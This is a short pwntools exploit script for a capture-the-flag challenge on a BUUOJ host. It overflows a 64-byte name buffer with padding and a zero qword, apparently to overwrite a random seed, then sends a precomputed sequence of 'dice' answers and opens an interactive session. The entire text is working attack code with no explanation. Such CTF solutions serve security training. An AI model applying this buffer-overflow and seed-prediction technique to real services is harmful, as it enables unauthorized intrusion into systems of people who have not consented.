from pwn import *
context.log_level='debug'
r = remote("node3.buuoj.cn", 29826)
nmsl = [2,5,4,2,6,2,5,1,4,2,3,2,3,2,6,5,1,1,5,5,6,3,4,4,3,3,3,2,2,2,6,1,1,1,6,4,2,5,2,5,4,4,4,6,3,2,3,3,6,1]
r.recvuntil(" let me know your name: ")
r.send("A" * 0x40 + p64(0))
for x in nmsl:
	r.recvuntil("Give me the point(1~6): ")
	r.sendline(str(x))

r.interactive()